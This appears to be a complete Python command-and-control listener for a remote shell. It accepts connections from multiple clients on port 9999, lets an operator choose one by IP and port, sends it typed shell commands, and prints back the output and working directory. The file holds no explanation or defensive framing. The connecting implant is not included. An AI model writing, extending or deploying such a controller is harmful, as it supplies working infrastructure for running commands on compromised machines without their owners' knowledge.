import json
import os
import socket
import threading

client_connections = {}
client_connections_lock = threading.Lock()
client_connected_event = threading.Event()

def start_server(host='0.0.0.0', port=9999):
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server_socket.bind((host, port))
    server_socket.listen(5)
    print(f"[*] Listening on {host}:{port}")

    while True:
        client_socket, addr = server_socket.accept()
        print(f"[+] Connection from {addr[0]}:{addr[1]} established.")

        with client_connections_lock:
            client_connections[addr] = {
                'socket': client_socket,
                'current_directory': '~',
                'response_event': threading.Event(),
                'last_response': ''
            }
            client_connected_event.set()  # Signal that a client is connected

        threading.Thread(target=handle_client, args=(client_socket, addr), daemon=True).start()

def handle_client(client_socket, addr):
    buffer = ""
    try:
        with client_socket as sock:
            while True:
                chunk = sock.recv(4096)
                if not chunk:
                    break

                buffer += chunk.decode('utf-8')

                while "\n" in buffer:
                    message, buffer = buffer.split("\n", 1)
                    try:
                        data = json.loads(message)
                        if data.get("type") == "response":
                            payload = data.get("payload", {})
                            output = payload.get("output", "")
                            current_directory = payload.get("current_directory", "~")

                            print(f"{output}")

                            with client_connections_lock:
                                client_connections[addr]['current_directory'] = current_directory
                                client_connections[addr]['last_response'] = output
                                client_connections[addr]['response_event'].set()
                    except json.JSONDecodeError as e:
                        print(f"[!] JSON decode error from {addr}: {e}")
    finally:
        with client_connections_lock:
            if addr in client_connections:
                del client_connections[addr]
                if not client_connections:
                    client_connected_event.clear()  # Clear event if no clients connected
        print(f"[-] Connection from {addr[0]}:{addr[1]} closed.")

def send_to_client(addr, command):
    message = json.dumps({
        "type": "command",
        "payload": {"command": command}
    }) + "\n"

    with client_connections_lock:
        client_socket = client_connections[addr]['socket']
        response_event = client_connections[addr]['response_event']
        response_event.clear()

    try:
        client_socket.sendall(message.encode('utf-8'))
        response_event.wait(timeout=30)
    except Exception as e:
        print(f"[!] Error sending command to {addr}: {e}")

def command_loop():
    print("[*] Waiting for clients to connect...")
    client_connected_event.wait()  # Wait until at least one client connects

    while True:
        with client_connections_lock:
            if not client_connections:
                print("[*] Waiting for clients to reconnect...")
                client_connected_event.wait()

            print("\n[*] Connected Clients:")
            for addr in client_connections:
                print(f"  - {addr[0]}:{addr[1]}")

        target_ip = input("Enter client IP: ").strip()
        target_port = int(input("Enter client port: ").strip())
        addr = (target_ip, target_port)

        with client_connections_lock:
            if addr not in client_connections:
                print("[!] Client not connected.")
                continue
            current_directory = client_connections[addr]['current_directory']

        print(f"[+] Connected to {target_ip}:{target_port}. Type 'exit' to disconnect.")
        while True:
            command = input(f"{target_ip}:{current_directory}> ").strip()

            if command.lower() == "exit":
                break
            elif command.lower() == "clear":
                os.system("clear")
                continue

            send_to_client(addr, command)

if __name__ == "__main__":
    threading.Thread(target=command_loop, daemon=True).start()
    start_server()
